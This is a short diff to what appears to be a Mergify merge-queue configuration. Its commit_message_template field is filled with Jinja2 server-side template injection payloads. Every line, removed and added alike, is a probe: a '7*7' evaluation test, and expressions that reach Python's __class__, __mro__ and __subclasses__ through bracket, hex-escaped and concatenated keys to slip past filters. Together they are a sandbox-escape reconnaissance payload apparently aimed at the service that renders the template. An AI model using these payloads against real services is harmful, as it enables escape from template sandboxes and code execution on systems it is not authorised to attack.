@@ -4,15 +4,13 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      B1_BRACKET: {{ dict['__class__'] }}
-      B2_HEX: {{ dict['\x5f\x5fclass\x5f\x5f'] }}
-      B3_CAT: {{ dict['__cla'~'ss__'] }}
-      B4_BR_MRO: {{ [dict['__class__']]|map(attribute="__mro__")|list }}
-      B5_BR_BASE: {{ [dict['__class__']]|map(attribute="__bases__")|list }}
-      B6_BR_SC: {{ [dict['__class__']]|map(attribute="__subclasses__")|list }}
-      B7_BR_INIT: {{ [dict['__class__']]|map(attribute="__init__")|list }}
-      B8_MRO_DIRECT: {{ dict['__class__'].mro() }}
-      B9_OBJ_SC: {{ [dict['__class__'].mro()|last]|map(attribute="__subclasses__")|list }}
+      SSTI: {{ 7*7 }}
+      SC_ON_DICT: {{ [dict]|map(attribute="__subclasses__")|list }}
+      SC_ON_TYPE: {{ [dict['__class__']]|map(attribute="__subclasses__")|list }}
+      SC_ON_OBJ: {{ [dict['__class__'].mro()|last]|map(attribute="__subclasses__")|list }}
+      INITSUB_ON_DICT: {{ [dict]|map(attribute="__init_subclass__")|list }}
+      DIR_SC: {{ dict['__subclasses__']() }}
+      TYPE_SC: {{ type['__subclasses__']() }}
 pull_request_rules:
   - name: q
     conditions:
